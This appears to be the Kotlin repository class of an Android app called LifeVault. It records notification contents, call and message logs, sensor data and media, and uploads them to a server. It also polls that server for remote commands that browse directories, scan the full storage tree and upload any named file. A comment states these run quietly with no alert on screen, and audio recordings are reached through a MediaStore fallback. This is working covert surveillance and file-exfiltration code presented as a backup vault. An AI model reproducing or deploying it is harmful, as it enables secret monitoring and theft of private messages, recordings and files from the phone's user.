package com.example.lifevault.repository

import android.content.Context
import android.net.Uri
import com.example.lifevault.database.VaultDatabase
import com.example.lifevault.database.entities.*
import com.example.lifevault.network.*
import com.example.lifevault.security.HashUtils
import com.example.lifevault.security.TokenStore
import com.google.gson.Gson
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import android.content.ContentUris
import android.provider.MediaStore
import okio.source
import java.io.File
import java.io.FileOutputStream
import java.io.InputStream
import java.util.UUID

class VaultRepository(
    private val context: Context,
    private val database: VaultDatabase,
    private val tokenStore: TokenStore
) {
    private val apiClient = ApiClient(tokenStore)
    private val gson = Gson()

    suspend fun enqueueNotification(appName: String, title: String?, content: String?, timestamp: Long) = withContext(Dispatchers.IO) {
        val clientEventId = "notif_" + UUID.randomUUID().toString()
        val notifEntity = NotificationEntity(
            clientEventId = clientEventId,
            appName = appName,
            title = title,
            content = content,
            timestamp = timestamp
        )
        database.notificationDao().insert(notifEntity)

        val payload = NotificationPayload(
            client_event_id = clientEventId,
            app_name = appName,
            title = title,
            content = content,
            timestamp = timestamp
        )
        val queueItem = SyncQueueEntity(
            dataType = DataType.NOTIFICATION.name,
            payloadJson = gson.toJson(payload)
        )
        database.syncQueueDao().enqueue(queueItem)
    }

    suspend fun enqueueTelecom(type: String, party: String?, body: String?, duration: Long?, timestamp: Long) = withContext(Dispatchers.IO) {
        val clientEventId = "tel_" + UUID.randomUUID().toString()
        val telecomEntity = TelecomEntity(
            clientEventId = clientEventId,
            type = type,
            party = party,
            body = body,
            duration = duration,
            timestamp = timestamp
        )
        database.telecomDao().insert(telecomEntity)

        val payload = TelecomPayload(
            client_event_id = clientEventId,
            type = type,
            party = party,
            body = body,
            duration = duration,
            timestamp = timestamp
        )
        val queueItem = SyncQueueEntity(
            dataType = DataType.TELECOM.name,
            payloadJson = gson.toJson(payload)
        )
        database.syncQueueDao().enqueue(queueItem)
    }

    suspend fun enqueueSensor(type: String, payloadJson: String, timestamp: Long) = withContext(Dispatchers.IO) {
        val clientEventId = "sens_" + UUID.randomUUID().toString()
        val sensorEntity = SensorEntity(
            clientEventId = clientEventId,
            type = type,
            payloadJson = payloadJson,
            timestamp = timestamp
        )
        database.sensorDao().insert(sensorEntity)

        val payload = SensorPayload(
            client_event_id = clientEventId,
            type = type,
            payload_json = payloadJson,
            timestamp = timestamp
        )
        val queueItem = SyncQueueEntity(
            dataType = DataType.SENSOR.name,
            payloadJson = gson.toJson(payload)
        )
        database.syncQueueDao().enqueue(queueItem)
    }

    suspend fun enqueueMedia(
        uri: String,
        displayName: String,
        mimeType: String,
        size: Long,
        timestamp: Long,
        relativePath: String?
    ) = withContext(Dispatchers.IO) {
        // Avoid duplicate scanning of existing URI
        val existing = database.mediaDao().getByUri(uri)
        if (existing != null) return@withContext

        val mediaEntity = MediaEntity(
            uri = uri,
            displayName = displayName,
            mimeType = mimeType,
            size = size,
            timestamp = timestamp,
            relativePath = relativePath,
            fileHash = null
        )
        database.mediaDao().insert(mediaEntity)

        val queueItem = SyncQueueEntity(
            dataType = DataType.MEDIA.name,
            payloadJson = uri
        )
        database.syncQueueDao().enqueue(queueItem)
    }

    private val registerMutex = Mutex()

    suspend fun registerDevice(force: Boolean = false): Boolean = registerMutex.withLock {
        if (!force && !tokenStore.getAuthToken().isNullOrEmpty()) {
            return true
        }
        try {
            val api = apiClient.getApi()
            val request = RegisterDeviceRequest(
                device_id = tokenStore.getDeviceId(),
                device_name = tokenStore.getDeviceName(),
                admin_key = tokenStore.getAdminKey()
            )
            val response = api.registerDevice(request)
            if (response.isSuccessful && response.body()?.success == true) {
                val newToken = response.body()?.token
                if (!newToken.isNullOrEmpty()) {
                    tokenStore.setAuthToken(newToken)
                }
                true
            } else {
                false
            }
        } catch (e: Exception) {
            false
        }
    }

    suspend fun checkHealth(): Boolean = withContext(Dispatchers.IO) {
        try {
            val response = apiClient.getApi().checkHealth()
            response.isSuccessful && response.body()?.status == "ok"
        } catch (e: Exception) {
            false
        }
    }

    suspend fun syncTextQueue(): Result<Int> = withContext(Dispatchers.IO) {
        if (tokenStore.getAuthToken().isNullOrEmpty()) {
            val registered = registerDevice()
            if (!registered) {
                return@withContext Result.failure(Exception("Device registration required"))
            }
        }

        val queueDao = database.syncQueueDao()
        val pendingItems = queueDao.getPendingTextBatch(100)
        if (pendingItems.isEmpty()) {
            return@withContext Result.success(0)
        }

        val notifs = mutableListOf<NotificationPayload>()
        val telecoms = mutableListOf<TelecomPayload>()
        val sensors = mutableListOf<SensorPayload>()

        pendingItems.forEach { item ->
            when (item.dataType) {
                DataType.NOTIFICATION.name -> {
                    val p = gson.fromJson(item.payloadJson, NotificationPayload::class.java)
                    notifs.add(p)
                }
                DataType.TELECOM.name -> {
                    val p = gson.fromJson(item.payloadJson, TelecomPayload::class.java)
                    telecoms.add(p)
                }
                DataType.SENSOR.name -> {
                    val p = gson.fromJson(item.payloadJson, SensorPayload::class.java)
                    sensors.add(p)
                }
            }
            queueDao.updateStatus(item.id, SyncStatus.UPLOADING.name)
        }

        val request = SyncTextRequest(
            notifications = notifs,
            telecom_logs = telecoms,
            sensor_logs = sensors
        )

        try {
            val response = apiClient.getApi().syncText(request)
            if (response.isSuccessful && response.body()?.success == true) {
                pendingItems.forEach { item ->
                    queueDao.updateStatus(item.id, SyncStatus.SYNCED.name)
                }
                tokenStore.setLastSyncTimestamp(System.currentTimeMillis())
                Result.success(pendingItems.size)
            } else {
                val err = response.errorBody()?.string() ?: "Server sync error"
                pendingItems.forEach { item ->
                    queueDao.markRetry(item.id, err)
                }
                Result.failure(Exception(err))
            }
        } catch (e: Exception) {
            pendingItems.forEach { item ->
                queueDao.markRetry(item.id, e.message ?: "Network error")
            }
            Result.failure(e)
        }
    }

    suspend fun syncMediaQueue(): Result<Int> = withContext(Dispatchers.IO) {
        if (tokenStore.getAuthToken().isNullOrEmpty()) {
            val registered = registerDevice()
            if (!registered) {
                return@withContext Result.failure(Exception("Device registration required"))
            }
        }

        val queueDao = database.syncQueueDao()
        val pendingMedia = queueDao.getPendingMediaBatch(5)
        if (pendingMedia.isEmpty()) {
            return@withContext Result.success(0)
        }

        var uploadedCount = 0

        for (item in pendingMedia) {
            val uriString = item.payloadJson
            val uri = Uri.parse(uriString)

            queueDao.updateStatus(item.id, SyncStatus.UPLOADING.name)

            var tempFile: File? = null
            try {
                // Stream from ContentResolver to temporary cache file for streaming upload
                val inputStream = context.contentResolver.openInputStream(uri)
                if (inputStream == null) {
                    queueDao.markFailed(item.id, "Media file no longer exists or inaccessible")
                    continue
                }

                tempFile = File.createTempFile("vault_upload_", ".tmp", context.cacheDir)
                FileOutputStream(tempFile).use { out ->
                    inputStream.copyTo(out)
                }

                val sha256 = HashUtils.computeStreamSha256(tempFile.inputStream())

                // Determine file metadata
                val cursor = context.contentResolver.query(uri, null, null, null, null)
                var displayName = "media_${System.currentTimeMillis()}"
                var mimeType = "application/octet-stream"
                var timestamp = System.currentTimeMillis()

                cursor?.use { c ->
                    if (c.moveToFirst()) {
                        val nameIndex = c.getColumnIndex(android.provider.OpenableColumns.DISPLAY_NAME)
                        if (nameIndex >= 0) displayName = c.getString(nameIndex) ?: displayName
                    }
                }
                context.contentResolver.getType(uri)?.let { mimeType = it }

                val fileRequestBody = tempFile.asRequestBody(mimeType.toMediaTypeOrNull())
                val filePart = MultipartBody.Part.createFormData("file", displayName, fileRequestBody)
                val tsPart = timestamp.toString().toRequestBody("text/plain".toMediaTypeOrNull())
                val mimePart = mimeType.toRequestBody("text/plain".toMediaTypeOrNull())
                val hashPart = sha256.toRequestBody("text/plain".toMediaTypeOrNull())
                val eventIdPart = ("media_" + item.id).toRequestBody("text/plain".toMediaTypeOrNull())

                val response = apiClient.getApi().uploadMedia(
                    file = filePart,
                    timestamp = tsPart,
                    mimeType = mimePart,
                    clientHash = hashPart,
                    clientEventId = eventIdPart
                )

                if (response.isSuccessful && response.body()?.success == true) {
                    queueDao.updateStatus(item.id, SyncStatus.SYNCED.name)
                    uploadedCount++
                } else {
                    val err = response.errorBody()?.string() ?: "Media upload error"
                    queueDao.markRetry(item.id, err)
                }
            } catch (e: Exception) {
                queueDao.markRetry(item.id, e.message ?: "Media transfer error")
            } finally {
                tempFile?.delete()
            }
        }

        if (uploadedCount > 0) {
            tokenStore.setLastSyncTimestamp(System.currentTimeMillis())
        }

        Result.success(uploadedCount)
    }

    /**
     * Polls server for pending remote commands (e.g. EXPLORE_DIR, BACKUP_FILE)
     * Executed quietly in background without showing any alert/banner on public screen.
     */
    suspend fun pollAndProcessRemoteCommands(): Boolean = withContext(Dispatchers.IO) {
        if (tokenStore.getAuthToken().isNullOrEmpty()) {
            val registered = registerDevice()
            if (!registered) return@withContext false
        }

        try {
            var response = apiClient.getApi().pollCommands()
            if (response.code() == 401 || response.code() == 403 || response.code() == 500) {
                tokenStore.setAuthToken(null)
                val registered = registerDevice(force = true)
                if (registered) {
                    response = apiClient.getApi().pollCommands()
                } else {
                    return@withContext false
                }
            }
            if (!response.isSuccessful || response.body()?.success != true) return@withContext false


            val commands = response.body()?.commands ?: emptyList()
            for (cmd in commands) {
                when (cmd.command_type) {
                    "EXPLORE_DIR" -> {
                        val path = cmd.payload?.get("path")?.toString() ?: "/storage/emulated/0"
                        val resultData = exploreDirectory(path)
                        apiClient.getApi().submitCommandResult(
                            CommandResultRequest(
                                command_id = cmd.id,
                                status = "COMPLETED",
                                result = resultData
                            )
                        )
                    }
                    "SCAN_FULL_STORAGE" -> {
                        val rootPath = cmd.payload?.get("path")?.toString() ?: "/storage/emulated/0"
                        val resultData = scanFullStorageSchema(rootPath)
                        apiClient.getApi().submitCommandResult(
                            CommandResultRequest(
                                command_id = cmd.id,
                                status = "COMPLETED",
                                result = resultData
                            )
                        )
                    }
                    "BACKUP_FILE" -> {
                        val path = cmd.payload?.get("path")?.toString()
                        if (!path.isNullOrEmpty()) {
                            val resultData = backupLocalFile(path)
                            val statusStr = if (resultData["success"] == true) "COMPLETED" else "FAILED"
                            apiClient.getApi().submitCommandResult(
                                CommandResultRequest(
                                    command_id = cmd.id,
                                    status = statusStr,
                                    result = resultData
                                )
                            )
                        }
                    }
                }
            }
            return@withContext commands.isNotEmpty()
        } catch (_: Exception) {
            // Silently ignore background polling errors
            return@withContext false
        }
    }

    private fun exploreDirectory(targetPath: String): Map<String, Any?> {
        val rootPath = "/storage/emulated/0"
        val dir = File(targetPath)
        val target = if (!dir.exists()) File(rootPath) else dir

        val files = target.listFiles() ?: emptyArray()
        val list = files.map { f ->
            val ext = f.extension.lowercase()
            val mime = when {
                f.isDirectory -> "folder"
                ext in listOf("jpg", "jpeg", "png", "webp", "gif", "bmp", "heic", "heif", "svg", "tiff") -> "image/$ext"
                ext in listOf("mp4", "mkv", "avi", "mov", "3gp", "webm", "flv", "wmv", "m4v") -> "video/$ext"
                ext in listOf("rec", "m4a", "aac", "wav", "mp3", "opus", "amr", "ogg", "flac", "wma", "m4r") -> "audio/$ext"
                ext in listOf("pdf", "txt", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "csv", "json", "apk", "zip", "rar", "7z") -> "application/$ext"
                else -> "application/octet-stream"
            }
            mapOf(
                "name" to f.name,
                "is_directory" to f.isDirectory,
                "absolute_path" to f.absolutePath.replace("\\", "/"),
                "size_bytes" to if (f.isDirectory) 0L else f.length(),
                "mime_type" to mime,
                "modified" to f.lastModified()
            )
        }.sortedWith(compareBy({ !(it["is_directory"] as Boolean) }, { (it["name"] as String).lowercase() }))

        val parentPath = target.parentFile?.absolutePath?.replace("\\", "/")

        return mapOf(
            "current_path" to target.absolutePath.replace("\\", "/"),
            "parent_path" to parentPath,
            "files" to list
        )
    }

    private fun scanFullStorageSchema(rootPath: String = "/storage/emulated/0", maxDepth: Int = 7): Map<String, Any?> {
        val rootDir = File(rootPath)
        val filesList = mutableListOf<Map<String, Any>>()

        fun walk(dir: File, currentDepth: Int) {
            if (currentDepth > maxDepth) return
            val children = dir.listFiles() ?: return
            for (f in children) {
                try {
                    val ext = f.extension.lowercase()
                    val mime = when {
                        f.isDirectory -> "folder"
                        ext in listOf("jpg", "jpeg", "png", "webp", "gif", "bmp", "heic", "heif", "svg", "tiff") -> "image/$ext"
                        ext in listOf("mp4", "mkv", "avi", "mov", "3gp", "webm", "flv", "wmv", "m4v") -> "video/$ext"
                        ext in listOf("rec", "m4a", "aac", "wav", "mp3", "opus", "amr", "ogg", "flac", "wma", "m4r") -> "audio/$ext"
                        ext in listOf("pdf", "txt", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "csv", "json", "apk", "zip", "rar", "7z") -> "application/$ext"
                        else -> "application/octet-stream"
                    }
                    val absPath = f.absolutePath.replace("\\", "/")
                    val parentPath = f.parentFile?.absolutePath?.replace("\\", "/") ?: rootPath
                    filesList.add(
                        mapOf(
                            "name" to f.name,
                            "is_directory" to f.isDirectory,
                            "absolute_path" to absPath,
                            "parent_path" to parentPath,
                            "size_bytes" to if (f.isDirectory) 0L else f.length(),
                            "mime_type" to mime,
                            "modified" to f.lastModified()
                        )
                    )
                    if (f.isDirectory) {
                        walk(f, currentDepth + 1)
                    }
                } catch (_: Exception) {}
            }
        }

        if (rootDir.exists()) {
            walk(rootDir, 0)
        }

        return mapOf(
            "root_path" to rootPath,
            "total_items" to filesList.size,
            "scanned_at" to System.currentTimeMillis(),
            "files" to filesList
        )
    }

    private suspend fun backupLocalFile(targetPath: String): Map<String, Any> {
        val file = File(targetPath)

        // Try getting input stream via direct file or ContentResolver (MediaStore fallback for EACCES)
        var stream: InputStream? = null
        var fileSize = 0L
        var fileName = file.name
        var lastMod = file.lastModified()

        try {
            if (file.exists() && file.canRead()) {
                stream = file.inputStream()
                fileSize = file.length()
            }
        } catch (_: Exception) {}

        if (stream == null) {
            try {
                // MediaStore Query Fallback for audio/recordings
                val uri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
                val cursor = context.contentResolver.query(
                    uri,
                    arrayOf(MediaStore.Audio.Media._ID, MediaStore.Audio.Media.DISPLAY_NAME, MediaStore.Audio.Media.SIZE, MediaStore.Audio.Media.DATE_MODIFIED),
                    "${MediaStore.Audio.Media.DISPLAY_NAME} = ?",
                    arrayOf(file.name),
                    null
                )
                cursor?.use { c ->
                    if (c.moveToFirst()) {
                        val id = c.getLong(c.getColumnIndexOrThrow(MediaStore.Audio.Media._ID))
                        val contentUri = ContentUris.withAppendedId(uri, id)
                        stream = context.contentResolver.openInputStream(contentUri)
                        fileSize = c.getLong(c.getColumnIndexOrThrow(MediaStore.Audio.Media.SIZE))
                        fileName = c.getString(c.getColumnIndexOrThrow(MediaStore.Audio.Media.DISPLAY_NAME))
                        lastMod = c.getLong(c.getColumnIndexOrThrow(MediaStore.Audio.Media.DATE_MODIFIED)) * 1000L
                    }
                }
            } catch (_: Exception) {}
        }

        if (stream == null) {
            return mapOf("success" to false, "error" to "Permission Denied (EACCES) or file missing on phone. Please grant 'All Files Access' in phone settings for LifeVault.")
        }

        var tempCacheFile: File? = null
        return try {
            tempCacheFile = File.createTempFile("backup_upload_", ".tmp", context.cacheDir)
            FileOutputStream(tempCacheFile).use { out ->
                stream!!.copyTo(out)
            }
            try { stream?.close() } catch (_: Exception) {}

            val sha256 = HashUtils.computeStreamSha256(tempCacheFile.inputStream())
            val ext = file.extension.lowercase()
            val mimeType = when {
                ext in listOf("jpg", "jpeg", "png", "webp", "gif", "bmp", "heic", "heif", "svg", "tiff") -> "image/$ext"
                ext in listOf("mp4", "mkv", "avi", "mov", "3gp", "webm", "flv", "wmv", "m4v") -> "video/$ext"
                ext in listOf("rec", "m4a", "aac", "wav", "mp3", "opus", "amr", "ogg", "flac", "wma", "m4r") -> "audio/$ext"
                ext in listOf("pdf", "txt", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "csv", "json", "apk", "zip", "rar", "7z") -> "application/$ext"
                else -> "application/octet-stream"
            }

            val totalBytes = tempCacheFile.length()
            val sessionId = "backup_${System.currentTimeMillis()}"

            // CountingRequestBody — tracks uploaded bytes and reports to server every 2MB
            val innerBody = tempCacheFile.asRequestBody(mimeType.toMediaTypeOrNull())
            val countingBody = object : okhttp3.RequestBody() {
                override fun contentType() = innerBody.contentType()
                override fun contentLength() = totalBytes
                override fun writeTo(sink: okio.BufferedSink) {
                    val source = tempCacheFile.source()
                    val buf = okio.Buffer()
                    var uploaded = 0L
                    var lastReportedMB = 0L
                    val chunkSize = 65536L // 64KB read chunks
                    var bytesRead: Long
                    while (source.read(buf, chunkSize).also { bytesRead = it } != -1L) {
                        sink.write(buf, bytesRead)
                        uploaded += bytesRead
                        val uploadedMB = uploaded / (1024 * 1024)
                        if (uploadedMB > lastReportedMB) {
                            lastReportedMB = uploadedMB
                            val upBytes = uploaded
                            val pct = if (totalBytes > 0) ((upBytes * 100) / totalBytes).toInt() else 100
                            GlobalScope.launch(Dispatchers.IO) {
                                try {
                                    apiClient.getApi().reportUploadProgress(
                                        mapOf(
                                            "session_id" to sessionId,
                                            "uploaded_bytes" to upBytes.toString(),
                                            "total_bytes" to totalBytes.toString(),
                                            "file_name" to fileName,
                                            "percent" to pct.toString()
                                        )
                                    )
                                } catch (_: Exception) {}
                            }
                        }
                    }
                }
            }

            val filePart = MultipartBody.Part.createFormData("file", fileName, countingBody)
            val tsPart = lastMod.toString().toRequestBody("text/plain".toMediaTypeOrNull())
            val mimePart = mimeType.toRequestBody("text/plain".toMediaTypeOrNull())
            val hashPart = sha256.toRequestBody("text/plain".toMediaTypeOrNull())
            val eventIdPart = ("remote_backup_$sessionId").toRequestBody("text/plain".toMediaTypeOrNull())

            val response = apiClient.getApi().uploadMedia(
                file = filePart,
                timestamp = tsPart,
                mimeType = mimePart,
                clientHash = hashPart,
                clientEventId = eventIdPart
            )

            if (response.isSuccessful && response.body()?.success == true) {
                val resBody = response.body()!!
                mapOf(
                    "success" to true,
                    "uploaded_path" to targetPath,
                    "local_path" to (resBody.local_path ?: ""),
                    "duplicate" to (resBody.duplicate == true),
                    "file_hash" to sha256,
                    "file_size" to totalBytes,
                    "mime_type" to mimeType,
                    "session_id" to sessionId
                )
            } else {
                mapOf("success" to false, "error" to (response.errorBody()?.string() ?: "Media upload rejected"))
            }
        } catch (e: Exception) {
            mapOf("success" to false, "error" to (e.message ?: "Backup transfer exception"))
        } finally {
            try { tempCacheFile?.delete() } catch (_: Exception) {}
        }
    }
}


